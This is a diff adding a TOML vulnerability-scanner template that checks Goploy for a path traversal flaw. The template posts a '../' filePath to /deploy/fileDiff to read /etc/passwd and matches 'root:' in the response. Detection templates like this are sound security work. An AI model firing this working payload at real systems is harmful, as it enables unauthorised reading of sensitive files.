@@ -1,0 +1,33 @@
+[info]
+author = "ave"
+description = "检测Goploy系统是否存在Path Traversal漏洞，通过向/deploy/fileDiff端点发送包含../的路径，读取系统敏感文件如/etc/passwd，验证是否存在任意文件读取漏洞。"
+id = "POC-AVE-2026-0413"
+name = "Goploy Path Traversal File Read POC"
+severity = "high"
+tags = ["ave-2026-0413"]
+vuln_id = [
+    "CVE-2026-53553",
+    "AVE-2026-0413",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/deploy/fileDiff"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"filePath": "../../../../../../../etc/passwd", "projectId": "{{ProjectID}}", "serverId": "{{ServerID}}"}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+G-N-ID = "{{NamespaceID}}"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["root:"]
